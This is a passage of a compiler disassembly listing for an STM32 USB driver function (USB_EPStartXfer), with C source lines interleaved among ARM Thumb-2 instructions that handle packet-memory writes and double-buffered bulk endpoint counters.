 8006a9e:	7b1b      	ldrb	r3, [r3, #12]
 8006aa0:	2b00      	cmp	r3, #0
 8006aa2:	d13a      	bne.n	8006b1a <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006aa4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aa8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aac:	681b      	ldr	r3, [r3, #0]
 8006aae:	6959      	ldr	r1, [r3, #20]
 8006ab0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ab4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ab8:	681b      	ldr	r3, [r3, #0]
 8006aba:	88da      	ldrh	r2, [r3, #6]
 8006abc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ac0:	b29b      	uxth	r3, r3
 8006ac2:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006ac6:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006aca:	6800      	ldr	r0, [r0, #0]
 8006acc:	f001 fcb9 	bl	8008442 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006ad0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ad4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ad8:	681b      	ldr	r3, [r3, #0]
 8006ada:	613b      	str	r3, [r7, #16]
 8006adc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ae0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ae4:	681b      	ldr	r3, [r3, #0]
 8006ae6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006aea:	b29b      	uxth	r3, r3
 8006aec:	461a      	mov	r2, r3
 8006aee:	693b      	ldr	r3, [r7, #16]
 8006af0:	4413      	add	r3, r2
 8006af2:	613b      	str	r3, [r7, #16]
 8006af4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006af8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006afc:	681b      	ldr	r3, [r3, #0]
 8006afe:	781b      	ldrb	r3, [r3, #0]
 8006b00:	00da      	lsls	r2, r3, #3
 8006b02:	693b      	ldr	r3, [r7, #16]
 8006b04:	4413      	add	r3, r2
 8006b06:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006b0a:	60fb      	str	r3, [r7, #12]
 8006b0c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b10:	b29a      	uxth	r2, r3
 8006b12:	68fb      	ldr	r3, [r7, #12]
 8006b14:	801a      	strh	r2, [r3, #0]
 8006b16:	f000 be1f 	b.w	8007758 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006b1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b22:	681b      	ldr	r3, [r3, #0]
 8006b24:	78db      	ldrb	r3, [r3, #3]
 8006b26:	2b02      	cmp	r3, #2
 8006b28:	f040 8462 	bne.w	80073f0 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006b2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b34:	681b      	ldr	r3, [r3, #0]
 8006b36:	6a1a      	ldr	r2, [r3, #32]
 8006b38:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b3c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b40:	681b      	ldr	r3, [r3, #0]
 8006b42:	691b      	ldr	r3, [r3, #16]
 8006b44:	429a      	cmp	r2, r3
 8006b46:	f240 83df 	bls.w	8007308 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006b4a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b4e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b52:	681a      	ldr	r2, [r3, #0]
 8006b54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b5c:	681b      	ldr	r3, [r3, #0]
 8006b5e:	781b      	ldrb	r3, [r3, #0]
 8006b60:	009b      	lsls	r3, r3, #2
 8006b62:	4413      	add	r3, r2
 8006b64:	881b      	ldrh	r3, [r3, #0]
 8006b66:	b29b      	uxth	r3, r3
 8006b68:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b6c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b70:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006b74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b78:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b7c:	681a      	ldr	r2, [r3, #0]
 8006b7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b86:	681b      	ldr	r3, [r3, #0]
 8006b88:	781b      	ldrb	r3, [r3, #0]
 8006b8a:	009b      	lsls	r3, r3, #2
 8006b8c:	441a      	add	r2, r3
 8006b8e:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006b92:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b96:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b9a:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006b9e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006ba2:	b29b      	uxth	r3, r3
 8006ba4:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006ba6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006baa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bae:	681b      	ldr	r3, [r3, #0]
 8006bb0:	6a1a      	ldr	r2, [r3, #32]
 8006bb2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006bb6:	1ad2      	subs	r2, r2, r3
 8006bb8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bbc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bc0:	681b      	ldr	r3, [r3, #0]
 8006bc2:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006bc4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bc8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bcc:	681a      	ldr	r2, [r3, #0]
 8006bce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bd2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bd6:	681b      	ldr	r3, [r3, #0]
 8006bd8:	781b      	ldrb	r3, [r3, #0]
 8006bda:	009b      	lsls	r3, r3, #2
 8006bdc:	4413      	add	r3, r2
 8006bde:	881b      	ldrh	r3, [r3, #0]
 8006be0:	b29b      	uxth	r3, r3
 8006be2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006be6:	2b00      	cmp	r3, #0
 8006be8:	f000 81c7 	beq.w	8006f7a <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006bec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bf0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bf4:	681b      	ldr	r3, [r3, #0]
 8006bf6:	633b      	str	r3, [r7, #48]	; 0x30
 8006bf8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bfc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c00:	681b      	ldr	r3, [r3, #0]
 8006c02:	785b      	ldrb	r3, [r3, #1]
 8006c04:	2b00      	cmp	r3, #0
 8006c06:	d177      	bne.n	8006cf8 <USB_EPStartXfer+0x2ce>
 8006c08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c0c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c10:	681b      	ldr	r3, [r3, #0]
 8006c12:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c14:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c18:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c1c:	681b      	ldr	r3, [r3, #0]
 8006c1e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006c22:	b29b      	uxth	r3, r3
 8006c24:	461a      	mov	r2, r3
 8006c26:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c28:	4413      	add	r3, r2
 8006c2a:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c2c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c30:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c34:	681b      	ldr	r3, [r3, #0]
 8006c36:	781b      	ldrb	r3, [r3, #0]
 8006c38:	00da      	lsls	r2, r3, #3
 8006c3a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c3c:	4413      	add	r3, r2
 8006c3e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006c42:	627b      	str	r3, [r7, #36]	; 0x24
 8006c44:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c46:	881b      	ldrh	r3, [r3, #0]
 8006c48:	b29b      	uxth	r3, r3
 8006c4a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006c4e:	b29a      	uxth	r2, r3
 8006c50:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c52:	801a      	strh	r2, [r3, #0]
 8006c54:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c58:	2b3e      	cmp	r3, #62	; 0x3e
 8006c5a:	d921      	bls.n	8006ca0 <USB_EPStartXfer+0x276>
 8006c5c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c60:	095b      	lsrs	r3, r3, #5
 8006c62:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c66:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c6a:	f003 031f 	and.w	r3, r3, #31
 8006c6e:	2b00      	cmp	r3, #0
 8006c70:	d104      	bne.n	8006c7c <USB_EPStartXfer+0x252>
 8006c72:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c76:	3b01      	subs	r3, #1
 8006c78:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c7c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c7e:	881b      	ldrh	r3, [r3, #0]
 8006c80:	b29a      	uxth	r2, r3
 8006c82:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c86:	b29b      	uxth	r3, r3
 8006c88:	029b      	lsls	r3, r3, #10
 8006c8a:	b29b      	uxth	r3, r3
 8006c8c:	4313      	orrs	r3, r2
 8006c8e:	b29b      	uxth	r3, r3
 8006c90:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c94:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c98:	b29a      	uxth	r2, r3
 8006c9a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c9c:	801a      	strh	r2, [r3, #0]
 8006c9e:	e050      	b.n	8006d42 <USB_EPStartXfer+0x318>
 8006ca0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ca4:	2b00      	cmp	r3, #0
 8006ca6:	d10a      	bne.n	8006cbe <USB_EPStartXfer+0x294>
 8006ca8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006caa:	881b      	ldrh	r3, [r3, #0]
 8006cac:	b29b      	uxth	r3, r3
 8006cae:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006cb2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006cb6:	b29a      	uxth	r2, r3
 8006cb8:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cba:	801a      	strh	r2, [r3, #0]
 8006cbc:	e041      	b.n	8006d42 <USB_EPStartXfer+0x318>
 8006cbe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cc2:	085b      	lsrs	r3, r3, #1
 8006cc4:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cc8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ccc:	f003 0301 	and.w	r3, r3, #1
 8006cd0:	2b00      	cmp	r3, #0
 8006cd2:	d004      	beq.n	8006cde <USB_EPStartXfer+0x2b4>
 8006cd4:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cd8:	3301      	adds	r3, #1
 8006cda:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cde:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ce0:	881b      	ldrh	r3, [r3, #0]
 8006ce2:	b29a      	uxth	r2, r3
 8006ce4:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ce8:	b29b      	uxth	r3, r3
 8006cea:	029b      	lsls	r3, r3, #10
 8006cec:	b29b      	uxth	r3, r3
 8006cee:	4313      	orrs	r3, r2
 8006cf0:	b29a      	uxth	r2, r3
 8006cf2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cf4:	801a      	strh	r2, [r3, #0]
 8006cf6:	e024      	b.n	8006d42 <USB_EPStartXfer+0x318>
 8006cf8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cfc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d00:	681b      	ldr	r3, [r3, #0]
 8006d02:	785b      	ldrb	r3, [r3, #1]
 8006d04:	2b01      	cmp	r3, #1
 8006d06:	d11c      	bne.n	8006d42 <USB_EPStartXfer+0x318>
 8006d08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d0c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d10:	681b      	ldr	r3, [r3, #0]
 8006d12:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d16:	b29b      	uxth	r3, r3
 8006d18:	461a      	mov	r2, r3
 8006d1a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d1c:	4413      	add	r3, r2
 8006d1e:	633b      	str	r3, [r7, #48]	; 0x30
 8006d20:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d24:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d28:	681b      	ldr	r3, [r3, #0]
 8006d2a:	781b      	ldrb	r3, [r3, #0]
 8006d2c:	00da      	lsls	r2, r3, #3
 8006d2e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d30:	4413      	add	r3, r2
 8006d32:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006d36:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006d38:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d3c:	b29a      	uxth	r2, r3
 8006d3e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006d40:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006d42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d4a:	681b      	ldr	r3, [r3, #0]
 8006d4c:	895b      	ldrh	r3, [r3, #10]
 8006d4e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006d52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d56:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d5a:	681b      	ldr	r3, [r3, #0]
 8006d5c:	6959      	ldr	r1, [r3, #20]
 8006d5e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d62:	b29b      	uxth	r3, r3
 8006d64:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006d68:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006d6c:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006d70:	6800      	ldr	r0, [r0, #0]
 8006d72:	f001 fb66 	bl	8008442 <USB_WritePMA>
            ep->xfer_buff += len;
 8006d76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d7e:	681b      	ldr	r3, [r3, #0]
 8006d80:	695a      	ldr	r2, [r3, #20]
 8006d82:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d86:	441a      	add	r2, r3
 8006d88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d90:	681b      	ldr	r3, [r3, #0]
 8006d92:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006d94:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d98:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d9c:	681b      	ldr	r3, [r3, #0]
 8006d9e:	6a1a      	ldr	r2, [r3, #32]
 8006da0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006da8:	681b      	ldr	r3, [r3, #0]
 8006daa:	691b      	ldr	r3, [r3, #16]
 8006dac:	429a      	cmp	r2, r3
 8006dae:	d90f      	bls.n	8006dd0 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006db0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006db8:	681b      	ldr	r3, [r3, #0]
 8006dba:	6a1a      	ldr	r2, [r3, #32]
 8006dbc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006dc0:	1ad2      	subs	r2, r2, r3
 8006dc2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dca:	681b      	ldr	r3, [r3, #0]
 8006dcc:	621a      	str	r2, [r3, #32]
 8006dce:	e00e      	b.n	8006dee <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006dd0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dd8:	681b      	ldr	r3, [r3, #0]
 8006dda:	6a1b      	ldr	r3, [r3, #32]
 8006ddc:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006de0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006de8:	681b      	ldr	r3, [r3, #0]
 8006dea:	2200      	movs	r2, #0
 8006dec:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006dee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006df2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006df6:	681b      	ldr	r3, [r3, #0]
 8006df8:	785b      	ldrb	r3, [r3, #1]
 8006dfa:	2b00      	cmp	r3, #0
 8006dfc:	d177      	bne.n	8006eee <USB_EPStartXfer+0x4c4>
 8006dfe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e02:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e06:	681b      	ldr	r3, [r3, #0]
 8006e08:	61bb      	str	r3, [r7, #24]
 8006e0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e0e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e12:	681b      	ldr	r3, [r3, #0]
 8006e14:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006e18:	b29b      	uxth	r3, r3
 8006e1a:	461a      	mov	r2, r3
 8006e1c:	69bb      	ldr	r3, [r7, #24]
 8006e1e:	4413      	add	r3, r2
 8006e20:	61bb      	str	r3, [r7, #24]
 8006e22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e2a:	681b      	ldr	r3, [r3, #0]
 8006e2c:	781b      	ldrb	r3, [r3, #0]
 8006e2e:	00da      	lsls	r2, r3, #3
 8006e30:	69bb      	ldr	r3, [r7, #24]
 8006e32:	4413      	add	r3, r2
 8006e34:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e38:	617b      	str	r3, [r7, #20]
 8006e3a:	697b      	ldr	r3, [r7, #20]
 8006e3c:	881b      	ldrh	r3, [r3, #0]
 8006e3e:	b29b      	uxth	r3, r3
 8006e40:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e44:	b29a      	uxth	r2, r3
 8006e46:	697b      	ldr	r3, [r7, #20]
 8006e48:	801a      	strh	r2, [r3, #0]
 8006e4a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e4e:	2b3e      	cmp	r3, #62	; 0x3e
 8006e50:	d921      	bls.n	8006e96 <USB_EPStartXfer+0x46c>
 8006e52:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e56:	095b      	lsrs	r3, r3, #5
 8006e58:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e5c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e60:	f003 031f 	and.w	r3, r3, #31
 8006e64:	2b00      	cmp	r3, #0
 8006e66:	d104      	bne.n	8006e72 <USB_EPStartXfer+0x448>
 8006e68:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e6c:	3b01      	subs	r3, #1
 8006e6e:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e72:	697b      	ldr	r3, [r7, #20]
 8006e74:	881b      	ldrh	r3, [r3, #0]
 8006e76:	b29a      	uxth	r2, r3
 8006e78:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e7c:	b29b      	uxth	r3, r3
 8006e7e:	029b      	lsls	r3, r3, #10
 8006e80:	b29b      	uxth	r3, r3
 8006e82:	4313      	orrs	r3, r2
 8006e84:	b29b      	uxth	r3, r3
 8006e86:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e8a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e8e:	b29a      	uxth	r2, r3
 8006e90:	697b      	ldr	r3, [r7, #20]
 8006e92:	801a      	strh	r2, [r3, #0]
 8006e94:	e056      	b.n	8006f44 <USB_EPStartXfer+0x51a>
 8006e96:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e9a:	2b00      	cmp	r3, #0
 8006e9c:	d10a      	bne.n	8006eb4 <USB_EPStartXfer+0x48a>
 8006e9e:	697b      	ldr	r3, [r7, #20]
 8006ea0:	881b      	ldrh	r3, [r3, #0]
 8006ea2:	b29b      	uxth	r3, r3
 8006ea4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006ea8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006eac:	b29a      	uxth	r2, r3
 8006eae:	697b      	ldr	r3, [r7, #20]
 8006eb0:	801a      	strh	r2, [r3, #0]
 8006eb2:	e047      	b.n	8006f44 <USB_EPStartXfer+0x51a>
 8006eb4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eb8:	085b      	lsrs	r3, r3, #1
 8006eba:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ebe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ec2:	f003 0301 	and.w	r3, r3, #1
 8006ec6:	2b00      	cmp	r3, #0
 8006ec8:	d004      	beq.n	8006ed4 <USB_EPStartXfer+0x4aa>
 8006eca:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ece:	3301      	adds	r3, #1
 8006ed0:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ed4:	697b      	ldr	r3, [r7, #20]
 8006ed6:	881b      	ldrh	r3, [r3, #0]
 8006ed8:	b29a      	uxth	r2, r3
 8006eda:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ede:	b29b      	uxth	r3, r3
 8006ee0:	029b      	lsls	r3, r3, #10
 8006ee2:	b29b      	uxth	r3, r3
 8006ee4:	4313      	orrs	r3, r2
 8006ee6:	b29a      	uxth	r2, r3
 8006ee8:	697b      	ldr	r3, [r7, #20]
 8006eea:	801a      	strh	r2, [r3, #0]
 8006eec:	e02a      	b.n	8006f44 <USB_EPStartXfer+0x51a>
 8006eee:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ef2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ef6:	681b      	ldr	r3, [r3, #0]
 8006ef8:	785b      	ldrb	r3, [r3, #1]
 8006efa:	2b01      	cmp	r3, #1
 8006efc:	d122      	bne.n	8006f44 <USB_EPStartXfer+0x51a>
 8006efe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f02:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f06:	681b      	ldr	r3, [r3, #0]
 8006f08:	623b      	str	r3, [r7, #32]
 8006f0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f0e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f12:	681b      	ldr	r3, [r3, #0]
 8006f14:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f18:	b29b      	uxth	r3, r3
 8006f1a:	461a      	mov	r2, r3
 8006f1c:	6a3b      	ldr	r3, [r7, #32]
 8006f1e:	4413      	add	r3, r2
 8006f20:	623b      	str	r3, [r7, #32]
 8006f22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f2a:	681b      	ldr	r3, [r3, #0]
 8006f2c:	781b      	ldrb	r3, [r3, #0]
 8006f2e:	00da      	lsls	r2, r3, #3
 8006f30:	6a3b      	ldr	r3, [r7, #32]
 8006f32:	4413      	add	r3, r2
 8006f34:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f38:	61fb      	str	r3, [r7, #28]
 8006f3a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f3e:	b29a      	uxth	r2, r3
 8006f40:	69fb      	ldr	r3, [r7, #28]
 8006f42:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006f44:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f48:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f4c:	681b      	ldr	r3, [r3, #0]
 8006f4e:	891b      	ldrh	r3, [r3, #8]
 8006f50:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f58:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f5c:	681b      	ldr	r3, [r3, #0]
 8006f5e:	6959      	ldr	r1, [r3, #20]
 8006f60:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f64:	b29b      	uxth	r3, r3
 8006f66:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006f6a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006f6e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006f72:	6800      	ldr	r0, [r0, #0]
 8006f74:	f001 fa65 	bl	8008442 <USB_WritePMA>
 8006f78:	e3ee      	b.n	8007758 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006f7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f82:	681b      	ldr	r3, [r3, #0]
 8006f84:	785b      	ldrb	r3, [r3, #1]
 8006f86:	2b00      	cmp	r3, #0
 8006f88:	d177      	bne.n	800707a <USB_EPStartXfer+0x650>
 8006f8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f8e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f92:	681b      	ldr	r3, [r3, #0]
 8006f94:	64bb      	str	r3, [r7, #72]	; 0x48
 8006f96:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f9a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f9e:	681b      	ldr	r3, [r3, #0]
 8006fa0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006fa4:	b29b      	uxth	r3, r3
 8006fa6:	461a      	mov	r2, r3
 8006fa8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006faa:	4413      	add	r3, r2
 8006fac:	64bb      	str	r3, [r7, #72]	; 0x48
 8006fae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fb2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fb6:	681b      	ldr	r3, [r3, #0]
